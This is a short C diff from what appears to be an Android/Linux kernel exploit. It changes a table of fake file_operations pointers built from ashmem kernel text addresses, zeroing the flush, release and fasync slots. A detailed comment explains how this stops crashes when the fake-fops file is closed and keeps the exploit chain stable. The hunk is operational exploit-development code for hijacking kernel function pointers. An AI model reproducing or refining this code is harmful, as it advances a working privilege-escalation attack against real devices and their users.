@@ -1424,7 +1424,23 @@ int refresh_fake_fops_text(int fd) {
     {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
     {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
     {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
-    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
+    /* Close-path slots zeroed through the +1 anchor (fix67): filp_close
+     * reads flush from table[0x79..0x80], __fput release from
+     * table[0x81..0x88], fasync from table[0x89..0x90].  RELEASE was
+     * ASHMEM_RELEASE here before -- its first byte lands at table[0x81]
+     * (fine for release) but the unwritten flush bytes were raw payload
+     * page residue: fix66's page held 0x1000000000000012 at flush and
+     * pipe_prepare's clone child exited into it (pstore pc=0x12,
+     * lr=filp_close+0x54).  A true release address would also put a
+     * KASLR-dependent non-zero byte at table[0x81], inside fasync's
+     * neighbouring span.  __fput skips a NULL release -- zero is the
+     * only value that makes EVERY close of a fake-fops file (clone
+     * child, third party, chain exit tail) deterministic-safe; the ashmem
+     * region of a probe fd leaks a few KB, harmless.  ks_neutralize's
+     * final sweep re-zeros the same span. */
+    {FOPS_FLUSH_OFF, 0},
+    {FOPS_RELEASE_OFF, 0},
+    {0x88, 0},
     {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
     {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
   };
